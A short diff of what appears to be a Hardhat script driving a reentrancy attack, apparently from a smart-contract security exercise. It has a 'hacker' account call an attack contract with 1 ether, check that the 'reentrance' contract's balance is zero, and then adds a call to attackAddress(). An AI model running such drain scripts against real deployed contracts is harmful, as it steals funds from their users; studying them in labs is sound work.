@@ -18,6 +18,8 @@ async function main() {
   await attack.connect(hacker).attack({value: hre.ethers.utils.parseEther("1")});
 
   console.log(await provider.getBalance(reentrance.address) == 0);
+  
+  await attack.attackAddress();
 }
 
 main()
